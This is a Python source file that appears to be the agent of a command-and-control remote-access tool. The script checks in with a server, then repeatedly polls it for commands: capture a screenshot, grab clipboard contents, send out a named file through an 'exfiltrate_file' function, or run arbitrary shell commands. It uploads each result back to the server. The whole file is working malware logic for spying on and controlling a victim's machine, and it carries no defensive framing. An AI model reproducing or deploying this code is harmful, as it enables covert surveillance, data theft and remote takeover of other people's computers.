from src import upload,screenshot,clipboard,files,command
import random, string
import requests
import json
import time

HOSTNAME="USER-PC"
IP="192.168.1.1"
# BASE_URL = "https://your-domain.translate.goog/"
BASE_URL = "http://127.0.0.1:8000/"

def random_string(length):
	letters=string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

ack_url=BASE_URL+HOSTNAME+"/"+IP+"/Status/ON/"
get_cmd=BASE_URL+"c/"+HOSTNAME+"/"+IP+"/"
requests.get(ack_url)

while True:
    url=get_cmd+random_string(24)
    action=json.loads(requests.get(url).content.decode())["actions"]
    print(url)
    args=action.split(" ")
    if args[0]=="screenshot":
        (md5,data)=screenshot.take_screenshot()
        upload.upload_data(BASE_URL,HOSTNAME,IP,"Screenshot",data,md5)
    elif args[0]=="clipboard":
        data=clipboard.get_clipboard()
        upload.upload_data(BASE_URL,HOSTNAME,IP,"Clipboard",data)
    elif args[0]=="download":
        (md5,data,filetype)=files.exfiltrate_file(args[1])
        if data:
            if filetype == "":
                filetype="FILE"
            upload.upload_data(BASE_URL,HOSTNAME,IP,filetype,data,md5)
    elif len(action)>0:
        data=command.execute_cmd(args)
        if data!="":
            upload.upload_data(BASE_URL,HOSTNAME,IP,"Command",data)
    time.sleep(15)